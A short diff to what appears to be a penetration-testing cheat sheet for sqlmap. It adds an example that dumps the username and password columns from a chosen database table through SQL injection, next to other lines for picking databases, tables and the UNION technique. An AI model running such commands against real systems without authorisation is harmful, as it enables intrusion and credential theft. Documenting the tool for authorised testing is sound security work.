@@ -21,7 +21,8 @@ render_with_liquid: true
 
         # Specify dabase name, table name, column name
         sqlmap -r request.txt -D database_name -T table_name -C column_name
-
+        # Specify multiple columns
+        sqlmap -r request.txt -D database_name -T table_name -C username,password
 
         # --technique=U: UNION attack
         # --delay=2: Time Delay
